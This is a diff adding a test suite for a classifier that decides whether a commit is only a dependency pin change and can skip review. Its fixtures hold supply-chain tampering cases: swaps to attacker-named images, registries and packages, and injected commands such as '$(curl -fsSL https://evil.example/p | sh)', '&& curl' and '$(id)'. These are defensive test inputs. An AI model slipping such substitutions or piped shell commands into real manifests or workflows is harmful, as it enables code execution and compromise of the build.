@@ -1,0 +1,592 @@
+import { afterEach, describe, expect, it } from 'vitest';
+import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join, dirname } from 'node:path';
+import { execFileSync } from 'node:child_process';
+import {
+  classifyFiles,
+  classifyRange,
+  isDependencyPinChange,
+  parseDiffPatch,
+} from '../index.js';
+
+const cases: [string, string, string, string, boolean][] = [
+  ...['image', 'uses'].map((key): [string, string, string, string, boolean] => [
+    '.github/workflows/ci.yml',
+    `jobs:\n  build:\n    env:\n      ${key}: example/policy:1\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo "$${key}"\n`,
+    'example/policy:1',
+    'example/policy:2',
+    false,
+  ]),
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    env:\n      image: node:22\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo "$image"\n',
+    'node:22\n    steps:\n      - uses: actions/checkout@v4',
+    'node:23\n    steps:\n      - uses: actions/checkout@v5',
+    false,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    container:\n      image: node:22\n    steps:\n      - run: echo ready\n',
+    'node:22',
+    'node:23',
+    true,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    services:\n      db:\n        image: postgres:17\n',
+    'postgres:17',
+    'postgres:18',
+    true,
+  ],
+  [
+    'action.yml',
+    'runs:\n  using: composite\n  steps:\n    - name: Checkout\n      uses: actions/checkout@v4\n',
+    '@v4',
+    '@v5',
+    true,
+  ],
+  ['values.yaml', 'retention:\n  tag: "1.0"\n', '1.0', '2.0', false],
+  [
+    'app.yaml',
+    'policy:\n  image: example:1\n',
+    'example:1',
+    'example:2',
+    false,
+  ],
+  [
+    'build.gradle',
+    `def payload = '''\nimplementation("com.example:policy:1.0")\n'''\ntasks.register('writePolicy') { doLast { file('policy.txt').text = payload } }\n`,
+    '1.0',
+    '2.0',
+    false,
+  ],
+  [
+    'build.gradle.kts',
+    'println("com.example:policy:1.0")\n',
+    '1.0',
+    '2.0',
+    false,
+  ],
+  [
+    'Gemfile',
+    `payload = <<~TEXT\ngem 'rails', '7.1'\nTEXT\nFile.write('policy.txt', payload)\n`,
+    '7.1',
+    '7.2',
+    false,
+  ],
+  ...['\\', '`'].map((escape): [string, string, string, string, boolean] => [
+    'Dockerfile',
+    `# escape=${escape}\nFROM node:22\nRUN printf "%s" ${escape}\nFROM example:1\n`,
+    'FROM node:22\nRUN printf "%s" ' + escape + '\nFROM example:1',
+    'FROM node:23\nRUN printf "%s" ' + escape + '\nFROM example:2',
+    false,
+  ]),
+  ...['"', "'"].map((quote): [string, string, string, string, boolean] => [
+    '.github/workflows/ci.yml',
+    `jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n      - run: ${quote}echo\n          image: node:22\n          ${quote}\n`,
+    `@v4\n      - run: ${quote}echo\n          image: node:22`,
+    `@v5\n      - run: ${quote}echo\n          image: node:23`,
+    false,
+  ]),
+  ...["'''", '"""'].map((quote): [string, string, string, string, boolean] => [
+    'pyproject.toml',
+    `[tool.example]\nscript = ${quote}\n[tool.poetry.dependencies]\nhttpx = '0.27.0'\n${quote}\n`,
+    '0.27.0',
+    '0.28.0',
+    false,
+  ]),
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n          cat > config.yml <<EOF\n          image: node:22\n          EOF\n',
+    'image: node:22',
+    'image: node:23',
+    false,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    steps:\n      - run: |\n          echo ready\n      - uses: actions/checkout@v4\n',
+    '@v4',
+    '@v5',
+    true,
+  ],
+  [
+    'Dockerfile',
+    'FROM node:22\nCOPY <<EOF /app/template\nFROM example:1\nEOF\n',
+    'example:1',
+    'example:2',
+    false,
+  ],
+  [
+    'package.json',
+    '{\n "dependencies": {\n "react": "18.2.0"\n },\n "scripts": {\n "test": "1.0.0"\n }\n}',
+    '18.2.0',
+    '18.3.1',
+    true,
+  ],
+  [
+    'package.json',
+    '{\n "dependencies": {\n "react": "18.2.0"\n },\n "scripts": {\n "test": "1.0.0"\n }\n}',
+    '1.0.0',
+    '2.0.0',
+    false,
+  ],
+  [
+    'package.json',
+    '{\n "config": {\n "port": "3000"\n }\n}',
+    '3000',
+    '4000',
+    false,
+  ],
+  [
+    'package.json',
+    '{\n "packageManager": "pnpm@10.2.1"\n}',
+    '10.2.1',
+    '10.3.0',
+    true,
+  ],
+  [
+    'composer.json',
+    '{\n "require": {\n "php": "^8.2"\n }\n}',
+    '^8.2',
+    '^8.3',
+    true,
+  ],
+  [
+    'pnpm-workspace.yaml',
+    'catalog:\n  react: ^18.2.0',
+    '^18.2.0',
+    '^18.3.1',
+    true,
+  ],
+  ['pnpm-workspace.yaml', 'settings:\n  port: 3000', '3000', '4000', false],
+  [
+    'Cargo.toml',
+    '[dependencies]\nserde = { version = "1.0.210", features = ["derive"] }',
+    '1.0.210',
+    '1.0.211',
+    true,
+  ],
+  [
+    'Cargo.toml',
+    '[dependencies]\nserde = { version = "1.0.210", features = ["derive"] }',
+    '"1.0.210", features = ["derive"]',
+    '"1.0.211", features = []',
+    false,
+  ],
+  ['Cargo.toml', '[package.metadata]\nport = "3000"', '3000', '4000', false],
+  [
+    'pyproject.toml',
+    '[tool.poetry.dependencies]\nhttpx = "^0.27.0"',
+    '0.27.0',
+    '0.28.0',
+    true,
+  ],
+  ['requirements.txt', 'requests==2.32.2', '2.32.2', '2.32.3', true],
+  ['go.mod', 'require example.com/lib/v2 v2.1.0', 'v2.1.0', 'v2.2.0', true],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4 # v4',
+    '@v4 # v4',
+    '@v5 # v5',
+    true,
+  ],
+  [
+    'go.mod',
+    'require golang.org/x/net v0.30.0 // indirect',
+    'v0.30.0',
+    'v0.31.0',
+    true,
+  ],
+  // An identity swap is not a version bump: only the version may change.
+  ['Dockerfile', 'FROM node:20\nRUN npm ci\n', 'node:20', 'node:22', true],
+  [
+    'Dockerfile',
+    'FROM node:20\nRUN npm ci\n',
+    'node:20',
+    'node@sha256:' + 'a'.repeat(64),
+    true,
+  ],
+  [
+    'Dockerfile',
+    'FROM node:20\nRUN npm ci\n',
+    'node:20',
+    'ghcr.io/attacker/node:20',
+    false,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    container:\n      image: postgres:16\n    steps:\n      - run: echo ready\n',
+    'postgres:16',
+    'evil.example/pg:16',
+    false,
+  ],
+  [
+    'compose.yaml',
+    'services:\n  db:\n    image: registry.example:5000/pg:16\n',
+    ':16',
+    ':17',
+    true,
+  ],
+  [
+    'compose.yaml',
+    'services:\n  db:\n    image: postgres:16\n',
+    'postgres:16',
+    'other/postgres:16',
+    false,
+  ],
+  [
+    'package.json',
+    '{\n "dependencies": {\n "lodash": "4.17.21"\n }\n}',
+    '"4.17.21"',
+    '"npm:evil-lodash@4.17.21"',
+    false,
+  ],
+  [
+    'package.json',
+    '{\n "dependencies": {\n "lodash": "npm:lodash-es@4.17.21"\n }\n}',
+    '4.17.21',
+    '4.17.22',
+    true,
+  ],
+  [
+    'package.json',
+    '{\n "dependencies": {\n "internal": "workspace:*"\n }\n}',
+    'workspace:*',
+    '1.0.0',
+    false,
+  ],
+  [
+    'package.json',
+    '{\n "packageManager": "pnpm@9.0.0"\n}',
+    'pnpm@9.0.0',
+    'yarn@4.0.0',
+    false,
+  ],
+  [
+    'pnpm-workspace.yaml',
+    'catalog:\n  react: ^18.2.0',
+    '^18.2.0',
+    'npm:evil@1.0.0',
+    false,
+  ],
+  [
+    'pom.xml',
+    '<project>\n  <artifactId>app</artifactId>\n  <version>1.0.0</version>\n  <dependencies>\n    <dependency>\n      <artifactId>lib</artifactId>\n      <version>2.0.0</version>\n    </dependency>\n  </dependencies>\n</project>\n',
+    '2.0.0',
+    '2.1.0',
+    true,
+  ],
+  [
+    'pom.xml',
+    '<project>\n  <artifactId>app</artifactId>\n  <version>1.0.0</version>\n  <dependencies>\n    <dependency>\n      <artifactId>lib</artifactId>\n      <version>2.0.0</version>\n    </dependency>\n  </dependencies>\n</project>\n',
+    '1.0.0',
+    '1.0.1',
+    false,
+  ],
+  // Rules that keep behavioural edits off the route, exercised with content.
+  [
+    'package.json',
+    '{\n "version": "1.0.0",\n "dependencies": {\n "react": "18.2.0"\n }\n}',
+    '"1.0.0"',
+    '"1.1.0"',
+    false,
+  ],
+  [
+    'package.json',
+    '{\n "dependencies": {\n "react": "18.2.0"\n },\n "scripts": {\n "lint": "eslint ."\n }\n}',
+    'eslint .',
+    'eslint . && curl example.invalid',
+    false,
+  ],
+  [
+    'Cargo.toml',
+    '[dependencies]\nserde = { version = "1.0.210" }',
+    '{ version = "1.0.210" }',
+    '{ version = "1.0.211", git = "https://example.invalid/serde" }',
+    false,
+  ],
+  [
+    'Cargo.toml',
+    '[dependencies]\nserde = { version = "1.0.210" }',
+    '{ version = "1.0.210" }',
+    '{ version = "1.0.211", path = "../serde" }',
+    false,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n',
+    '@v4',
+    '@main',
+    false,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n',
+    'actions/checkout@v4',
+    'evil/checkout@v4',
+    false,
+  ],
+  [
+    'Dockerfile',
+    'FROM node:20\nRUN npm ci\n',
+    'node:20',
+    '${BASE_IMAGE}',
+    false,
+  ],
+  [
+    'pom.xml',
+    '<dependency>\n<version>3.3.4</version>\n</dependency>',
+    '3.3.4',
+    '3.3.5',
+    true,
+  ],
+  [
+    'build.gradle.kts',
+    'implementation("com.squareup.okio:okio:3.9.1")',
+    '3.9.1',
+    '3.9.2',
+    false,
+  ],
+  ['Gemfile', "gem 'rails', '~> 7.2.1'", '7.2.1', '7.2.2', false],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    steps:\n      - uses: actions/checkout@' +
+      'a'.repeat(40),
+    'a'.repeat(40),
+    'b'.repeat(40),
+    true,
+  ],
+  [
+    'Dockerfile',
+    'FROM --platform=linux/amd64 node:22 AS build\nRUN npm test',
+    'node:22',
+    'node:23',
+    true,
+  ],
+  [
+    'Dockerfile',
+    'FROM --platform=linux/amd64 node:22 AS build',
+    'linux/amd64 node:22',
+    'linux/arm64 node:23',
+    false,
+  ],
+  [
+    'Dockerfile',
+    'FROM node:22 AS build',
+    'node:22 AS build',
+    'node:23 AS other',
+    false,
+  ],
+  [
+    'Dockerfile',
+    'FROM node:22\nRUN npm test',
+    'node:22\nRUN npm test',
+    'node:23\nRUN npm publish',
+    false,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm test',
+    '@v4\n      - run: npm test',
+    '@v5\n      - run: npm publish',
+    false,
+  ],
+  [
+    'docker-compose.yml',
+    'services:\n  db:\n    image: postgres:17.1',
+    '17.1',
+    '17.2',
+    true,
+  ],
+  ['charts/app/values.yaml', 'image:\n  tag: "1.4.2"', '1.4.2', '1.4.3', false],
+  [
+    'docker-compose.yml',
+    'services:\n  app:\n    image: node:22\n  db:\n    image: postgres:17',
+    '    image: node:22\n  db:',
+    '  db:\n    image: node:23',
+    false,
+  ],
+  // Blank and comment-only lines keep the YAML parent path.
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: actions/setup-node@v4\n',
+    'setup-node@v4',
+    'setup-node@v5',
+    true,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    "jobs:\n  build:\n    steps:\n# don't cache\n      - uses: actions/setup-node@v4\n",
+    'setup-node@v4',
+    'setup-node@v5',
+    true,
+  ],
+  [
+    'docker-compose.yml',
+    'services:\n  app:\n    image: node:22\n\n  db:\n    image: postgres:17\n',
+    'postgres:17',
+    'postgres:18',
+    true,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  build:\n    env:\n\n      image: node:22\n    steps:\n      - run: echo "$image"\n',
+    'node:22',
+    'node:23',
+    false,
+  ],
+  // A `name@version` value that is a path names a local directory.
+  [
+    'package.json',
+    '{\n  "dependencies": {\n    "foo": "./vendor/foo@1.0.0"\n  }\n}\n',
+    '1.0.0',
+    '2.0.0',
+    false,
+  ],
+  // Dotted TOML source fields repoint a dependency; a dotted version does not.
+  ...['path', 'git', 'rev', 'tag', 'branch'].map(
+    (field): [string, string, string, string, boolean] => [
+      'Cargo.toml',
+      `[dependencies]\nfoo.${field} = "1.0"\n`,
+      '1.0',
+      '2.0',
+      false,
+    ],
+  ),
+  [
+    'Cargo.toml',
+    '[dependencies]\nserde.version = "1.0.1"\n',
+    '1.0.1',
+    '1.0.2',
+    true,
+  ],
+  // A heredoc inside an anchored or tagged block scalar is not a step's `uses`.
+  ...['"run": &s |', 'run: !!str |'].map(
+    (header): [string, string, string, string, boolean] => [
+      '.github/workflows/ci.yml',
+      `jobs:\n  a:\n    steps:\n      - name: x\n        ${header}\n          cat >/dev/null <<END\n          uses: actions/checkout@v4 # pin\n          END\n`,
+      '# pin',
+      '# $(curl -fsSL https://evil.example/p | sh)',
+      false,
+    ],
+  ),
+  // Only a version-shaped comment beside an action pin is masked.
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  a:\n    steps:\n      - uses: actions/checkout@0123456789012345678901234567890123456789 # v4.1.1\n',
+    '0123456789012345678901234567890123456789 # v4.1.1',
+    '1123456789012345678901234567890123456789 # v4.2.0',
+    true,
+  ],
+  [
+    '.github/workflows/ci.yml',
+    'jobs:\n  a:\n    steps:\n      - uses: actions/checkout@0123456789012345678901234567890123456789 # v4.1.1\n',
+    '0123456789012345678901234567890123456789 # v4.1.1',
+    '1123456789012345678901234567890123456789 # v4.2.0 $(id)',
+    false,
+  ],
+  // `mix.lock` is evaluated as Elixir, so it is not a content-free lockfile.
+  [
+    'mix.lock',
+    '%{\n  "jason": {:hex, :jason, "1.4.0", "abc", [:mix], [], "hexpm", "def"},\n}\n',
+    '"1.4.0"',
+    '"1.4.1"',
+    false,
+  ],
+];
+
+describe('dependency pin context', () => {
+  it('keeps renames and mode transitions on the review route', () => {
+    for (const patch of [
+      'diff --git a/src/main.js b/package-lock.json\nsimilarity index 100%\nrename from src/main.js\nrename to package-lock.json\n',
+      'diff --git a/package-lock.json b/package-lock.json\nold mode 100644\nnew mode 100755\n',
+      'diff --git a/vendor/lib b/vendor/renamed\nsimilarity index 100%\nrename from vendor/lib\nrename to vendor/renamed\nindex aaaaaaa..aaaaaaa 160000\n',
+      // A lockfile replaced by a symlink: Git prints a delete and an add.
+      'diff --git a/pnpm-lock.yaml b/pnpm-lock.yaml\ndeleted file mode 100644\nindex 1111111..0000000\n--- a/pnpm-lock.yaml\n+++ /dev/null\n@@ -1 +0,0 @@\n-lockfileVersion: 1\ndiff --git a/pnpm-lock.yaml b/pnpm-lock.yaml\nnew file mode 120000\nindex 0000000..2222222\n--- /dev/null\n+++ b/pnpm-lock.yaml\n@@ -0,0 +1 @@\n+run.sh\n\\ No newline at end of file\n',
+    ]) {
+      const report = classifyFiles(parseDiffPatch(patch));
+      expect(report.dependencyUpdate).toBe(false);
+      expect(report.skip).toBe(false);
+    }
+  });
+  it.each(cases)(
+    '%s %s: %s -> %s, pin-only=%s',
+    (path, beforeContent, from, to, expected) => {
+      const afterContent = beforeContent.replace(from, to);
+      const before = beforeContent.split('\n');
+      const after = afterContent.split('\n');
+      expect(
+        isDependencyPinChange({
+          path,
+          beforeContent,
+          afterContent,
+          added: 1,
+          deleted: 1,
+          changedLines: [
+            ...before.filter((line) => !after.includes(line)),
+            ...after.filter((line) => !before.includes(line)),
+          ],
+        }),
+      ).toBe(expected);
+    },
+  );
+});
+
+describe('pinned range dependency classification', () => {
+  const original = process.cwd();
+  let directory: string | undefined;
+  afterEach(() => {
+    process.chdir(original);
+    if (directory) rmSync(directory, { recursive: true, force: true });
+  });
+
+  it('does not bypass review when Git detects a source-to-lockfile rename', () => {
+    directory = mkdtempSync(join(tmpdir(), 'dependency-rename-'));
+    process.chdir(directory);
+    const git = (...args: string[]) =>
+      execFileSync('git', args, {
+        encoding: 'utf8',
+        stdio: ['pipe', 'pipe', 'pipe'],
+      }).trim();
+    git('init');
+    git('config', 'user.email', 'test@example.com');
+    git('config', 'user.name', 'Test');
+    writeFileSync('main.js', 'console.log("hello");\n');
+    git('add', '.');
+    git('-c', 'commit.gpgsign=false', 'commit', '-m', 'base');
+    const base = git('rev-parse', 'HEAD');
+    git('mv', 'main.js', 'package-lock.json');
+    git('-c', 'commit.gpgsign=false', 'commit', '-m', 'rename');
+    const report = classifyRange({ base, head: git('rev-parse', 'HEAD') });
+    expect(report.dependencyUpdate).toBe(false);
+    expect(report.skip).toBe(false);
+  });
+
+  it.each(cases)(
+    'classifies committed context in %s: %s',
+    (path, before, from, to, expected) => {
+      directory = mkdtempSync(join(tmpdir(), 'dependency-range-'));
+      process.chdir(directory);
+      const git = (...args: string[]) =>
+        execFileSync('git', args, {
+          encoding: 'utf8',
+          stdio: ['pipe', 'pipe', 'pipe'],
+        }).trim();
+      git('init');
+      git('config', 'user.email', 'test@example.com');
+      git('config', 'user.name', 'Test');
+      mkdirSync(dirname(path), { recursive: true });
+      writeFileSync(path, before);
+      git('add', '.');
+      git('-c', 'commit.gpgsign=false', 'commit', '-m', 'base');
+      const base = git('rev-parse', 'HEAD');
+      writeFileSync(path, before.replace(from, to));
+      git('add', '.');
+      git('-c', 'commit.gpgsign=false', 'commit', '-m', 'head');
+      const head = git('rev-parse', 'HEAD');
+      writeFileSync(path, 'uncommitted and irrelevant');
+      expect(classifyRange({ base, head }).dependencyUpdate).toBe(expected);
+    },
+  );
+});
